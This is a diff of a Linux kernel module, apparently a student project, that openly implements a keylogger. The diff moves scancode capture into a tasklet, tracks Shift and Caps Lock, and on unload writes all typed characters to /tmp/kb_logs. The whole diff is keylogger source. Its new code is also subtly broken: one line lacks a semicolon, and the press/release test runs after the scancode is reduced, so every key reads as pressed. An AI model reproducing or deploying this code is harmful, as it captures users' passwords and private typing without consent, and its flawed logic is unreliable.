@@ -25,7 +25,7 @@
 #include <linux/fs.h>
 #include <asm/uaccess.h>
 #include <linux/mm.h>
-
+#include <linux/keyboard.h>
 
 #include "struct.h"
 
@@ -47,42 +47,91 @@ MODULE_DESCRIPTION("Keyboard interrupt handler");
    */
 
 static struct miscdevice kbhandler;
+static unsigned char sc;
 
-irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs)
+static void got_char(unsigned long scancode_addr);
+DECLARE_TASKLET(kbtask, got_char, (unsigned long)&sc);
+
+static struct file *file_open(const char *path, int flags, int rights) 
 {
-	static unsigned char scancode;
+    struct file *filp = NULL;
+    mm_segment_t oldfs;
+    int err = 0;
+
+    oldfs = get_fs();
+    set_fs(get_ds());
+    filp = filp_open(path, flags, rights);
+    set_fs(oldfs);
+    if (IS_ERR(filp)) {
+        err = PTR_ERR(filp);
+        return NULL;
+    }
+    return filp;
+}
+
+static int file_write(struct file *file, loff_t *offset, unsigned char *data, unsigned int size) 
+{
+    mm_segment_t oldfs;
+    int ret;
+
+    oldfs = get_fs();
+    set_fs(get_ds());
+
+    ret = kernel_write(file, data, size, offset);
+
+    set_fs(oldfs);
+    return ret;
+}
+
+static void file_close(struct file *file)
+{
+    filp_close(file, NULL);
+}
+
+static void got_char(unsigned long scancode_addr)
+{
 	static char multi = 0;
+	static char caps = 0;
 	static char state = 0;
 	static struct s_stroke *new, *tmp;
 	static struct tm time;
 	static struct timespec ts;
 	struct keycodes *array;
+	unsigned char scancode = *(char *)scancode_addr;
 
 	if (!(new = kmalloc(sizeof(struct s_stroke), GFP_ATOMIC)))
-		goto end;
-	scancode = inb (0x60) % 256;
+		return;
 	if (scancode == 0xe0) {
 		multi = 1;
-		goto end;
+		return;
 	}
-	if (scancode > 128) {
-		scancode = scancode - 128;
-		state = 0;
-	}
-	else
-		state = 1;
-
+	/*
+	 * Setting correct flags and states
+	 */
+	scancode = scancode > 128 ? scancode - 128 : scancode;
+	state = scancode > 128 ? 0 : 1
+	(0x2A == scancode && state) ? caps = 1 : 0;
+	(0x2A == scancode && !state) ? caps = 0 : 0;
+	(0x3A == scancode && state) ? caps = !caps : 0;
 	array = multi ? multi_scancodes : simple_scancodes;
+	
+	/*
+	 * Filling list node
+	 */
+	getnstimeofday(&ts);
+	time_to_tm(ts.tv_sec, 0, &time);
 	new->key = scancode;
 	new->state = state;
 	new->name = array[scancode].name;
-	new->value = array[scancode].ascii;
+	new->value = caps ? array[scancode].caps : array[scancode].ascii;
 	new->print = array[scancode].print;
 	new->multi = multi;
-	getnstimeofday(&ts);
-	time_to_tm(ts.tv_sec, 0, &time);
 	new->time = time;
 	new->next = NULL;
+	
+	/*
+	 * Saving new list node at correct place
+	 */
 	if (!stroke_head)
 		stroke_head = new;
 	else {
@@ -92,61 +141,39 @@ irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs)
 		tmp->next = new;
 	}
 	multi = 0;
-end:
+}
+
+irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs)
+{
+	sc = inb(0x60) % 256;
+	tasklet_schedule(&kbtask);
 	return (irq_handler_t) IRQ_HANDLED;
 }
 
-static char	*ft_strjoin(char *s1, char *s2)
+static void write_logs(void)
 {
-	char	*new;
-	size_t	i;
-	size_t	j;
-
-	i = 0;
-	j = 0;
-	s1 ? i = strlen(s1) : 0;
-	s2 ? j = strlen(s2) : 0;
-	new = (char *)kmalloc(sizeof(char) * (i + j + 1), GFP_KERNEL);
-	if (!new)
-		return (NULL);
-	s1 ? strcpy(new, (char *)s1) : 0;
-	s2 ? strcpy(new + i, (char *)s2) : 0;
-	return (new);
-}
-
-/*
-static ssize_t long_read(struct file *f, char __user *s, size_t n, loff_t *o)
-{
-	struct s_stroke *tmp;
-	static char buf[256] = {0};
-	static char *ptr, *t;
-	int ret = -EFAULT, rmode = 0;
+	static loff_t offset = 0;
+	struct s_stroke *tmp, *save;
+	struct file *f;
+	unsigned char c;
 
 	tmp = stroke_head;
-	ptr = NULL;
-	while (!rmode && tmp) {
-		snprintf(buf, 256, "[%d:%d:%d] %s (%s%#x) %s\n", \
-			tmp->time.tm_hour, tmp->time.tm_min, tmp->time.tm_sec, \
-			tmp->name, \
-			tmp->multi ? "0xe0, " : "", tmp->key, \
-			tmp->state ? "pressed" : "released");
-		t = ptr;
-		if (!(ptr = ft_strjoin(ptr, buf)))
-			goto out;
-		kfree(t);
-		tmp = tmp->next;
+	f = file_open("/tmp/kb_logs", O_CREAT | O_WRONLY | O_APPEND, 0644);
+	if (!f)
+		return ;
+	while (tmp)
+	{
+		if (tmp->print == 1 && tmp->state == 1) {
+			c = tmp->value;
+			file_write(f, &offset, &c, 1);
+		}
+		save = tmp->next;
+		kfree(tmp);
+		tmp = save;
 	}
-	ret = simple_read_from_buffer(s, n, o, ptr, strlen(ptr));
-	rmode = ret ? 1 : 0;
-	kfree(ptr);
-out:
-	return ret;
-}
+	file_close(f);
 
-struct file_operations kbfops = {
-	.read = long_read
-};
-*/
+}
 
 static int long_read(struct seq_file *m, void *v)
 {
@@ -188,29 +215,9 @@ static int __init hello_init(void) {
 }
 
 static void __exit hello_cleanup(void) {
-	static struct s_stroke *tmp, *save;
-	static char buffer[256] = {0};
-	int n;
-
 	printk(KERN_INFO "Destroying keylogger module.\n");
-	tmp = stroke_head;
-	while (tmp)
-	{
-		if (tmp->print == 1 && tmp->state == 1) {
-			n = strlen(buffer);
-			if (n >= 255) {
-				printk("%s\n", buffer);
-				memset(buffer, 0, 256);
-			}
-			buffer[n] = tmp->value;
-			buffer[n + 1] = 0;
-		}
-		save = tmp->next;
-		kfree(tmp);
-		tmp = save;
-	}
-	printk("%s\n", buffer);
 	misc_deregister(&kbhandler);
+	write_logs();
 	free_irq(1, (void *)(irq_handler));
 }
 
